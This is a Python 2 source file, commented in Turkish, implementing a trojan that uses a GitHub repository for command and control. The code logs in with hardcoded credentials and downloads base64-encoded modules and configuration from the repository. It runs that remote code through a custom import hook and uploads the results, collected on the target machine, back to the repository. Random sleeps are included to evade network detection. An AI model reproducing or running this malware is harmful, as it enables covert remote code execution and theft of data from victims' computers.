import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login
from datetime import datetime
from uuid import getnode
import platform
import _strptime

trojan_id = "abc" #bu truva atini benzersiz sekilde tanimlayan trojan_id degiskenidir.
 

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules= []
configured = False
task_queue = Queue.Queue()
#bu gerekli ice aktarmalara sahip basit bir kurulum kodudur.
#bu dort islev trojan ile github arasindaki temel etkilesimi temsil eder.



class GitImporter(object):#yorumlayici mevcut olamyan bir modulu yuklemeyi denediginde bu sinifimiz kullanir
    def __init__(self):
        self.current_module_code = ""
        
    def find_module(self,fullname,path=None): #modulu bulmada ilk cagrilir
        if configured:
            print ("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)# bu cagriyi uzak dosya  yukleyicimize iletiyoruzve dosyayi depomuzda bulabilirsek kodu base64 ile decode edip sinifimizda saklariz
            
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self #selfe donerek python yorumlayicisina modulu buldugumuzu ve daha sonra onu gercekten yuklemek icin load_module fonksiyonumuzu cagirabilecegin belirtiyoruz.
            
        return None
    
    def load_module(self,name):
        module = imp.new_module(name) #ilk olarak yeni bir bos modul nesnesi olusurmak icin native imp modulunu kullaniyoruz ve sonra githubdan alinan kodu ona yerlestiriyoruz
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module # yeni olusturulan modulu sys.modules listesine eklemektir.boylece gelecekteki ice aktarma cagrilari tarafindan yakalanabilir.
        
        return module    


def connect_to_github(): #baglanam islemi , yetkilendirme vermyee calis boylece biri yakalanirsa truva atinin digerlerini silmesinler
    gh = login(username="sinemsahn",password="parola")
    repo = gh.repository("sinemsahn","blackrepo")
    branch = repo.branch("master")
    return gh,repo,branch


def get_file_contents(filepath):#dosyalari uzak depodan almaktan ve ardindan icerigi yerel olarak okumaktan sorumludur bu hem yapilandirma config  seceneklerini okumak hem de modul kaynak kodunu okumak icin kullanilir.
    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print ("[*] Found file %s" % filepath)
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config():#truva atinizin hangi modulleri calistiracagini bilmesi icin depodan uzak yapilandirma belgesini almaktan sorumludur.
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True
    
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    return config

def store_module_result(data): # hedef makinede topladiginiz herhnagi bir veriyi gondermek icin kullanilir.
    gh,repo,branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))
    return



    

def module_runner(module):
        
    task_queue.put(1)
    result = sys.modules[module].run() # modulun run islevini cagiriir
    task_queue.get()
        
        # store the result in our repo
    store_module_result(result) # run bittiginde sonucu dhaa sonra depomuza gonderecegimiz bir dizeyle alamliyiz
        
    return
    
    # main trojan loop
sys.meta_path = [GitImporter()] # uygulamanin ana dongusune baslamadan once ozel modul importer eklediginiz kontrolu
    
while True:
    if task_queue.empty(): # ilk adim conf dosyasini depodan almak ve ardindan modulu kendi is parcaciginda baslatmaktir.
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10)) # trojan herhangi bir ag engellemsine takilmamak icin uyur
    time.sleep(random.randint(1000,10000))    #trojanin ne yaptigini gizlemek icin google.com veya baska bircok seye bir miktar traifk olusturaiblirisin
    
    
    # bu bilgisayardaki bilgileri alir githubdan import eddigi modullere gore bilgileri alir ve sonra tekrar oraya yazar mi
    
